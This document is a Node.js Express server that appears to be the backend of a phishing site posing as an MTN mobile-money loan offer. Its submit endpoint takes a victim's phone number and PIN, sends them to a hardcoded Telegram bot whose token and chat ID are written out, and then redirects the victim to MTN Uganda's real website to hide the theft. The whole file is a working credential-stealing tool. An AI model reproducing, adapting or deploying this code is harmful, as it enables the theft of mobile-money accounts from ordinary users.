const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Your Telegram credentials
const BOT_TOKEN = '8534532793:AAEMJI4fShqN37xpy-M7uG8iRox0YWZMpI0';
const CHAT_ID = '8999616005';

// Middleware
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type']
}));
app.use(express.json());

// Test endpoint - GET request to check if server is alive
app.get('/', (req, res) => {
    res.json({ status: 'alive', message: 'Server is running' });
});

// Test endpoint to check POST manually
app.get('/test', (req, res) => {
    res.json({ message: 'POST to /api/submit with { phone, pin }' });
});

// Main submission endpoint
app.post('/api/submit', async (req, res) => {
    console.log('📥 Request received');
    console.log('Body:', req.body);
    
    const { phone, pin } = req.body;
    
    // Validate input
    if (!phone || !pin) {
        console.log('❌ Missing phone or pin');
        return res.status(400).json({ error: 'Phone and PIN are required' });
    }
    
    // Format message for Telegram
    const message = `🔐 NEW SUBMISSION\n\n📱 Phone: ${phone}\n🔢 PIN: ${pin}\n⏰ Time: ${new Date().toLocaleString()}`;
    
    try {
        console.log('📤 Sending to Telegram...');
        
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        
        console.log('✅ Telegram sent:', response.data.ok);
        
        res.json({ 
            success: true, 
            message: 'Data received and forwarded',
            redirect: 'https://www.mtn.co.ug/'
        });
        
    } catch (error) {
        console.error('❌ Error details:');
        
        if (error.response) {
            // Telegram API returned an error
            console.error('Telegram error:', error.response.data);
            res.status(500).json({ 
                error: 'Telegram API error', 
                details: error.response.data.description 
            });
        } else {
            // Other errors
            console.error('Other error:', error.message);
            res.status(500).json({ error: 'Internal server error', details: error.message });
        }
    }
});

// Handle OPTIONS preflight requests
app.options('/api/submit', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 Test GET: https://momoloan-production.up.railway.app/`);
    console.log(`📍 Test POST: /api/submit`);
});
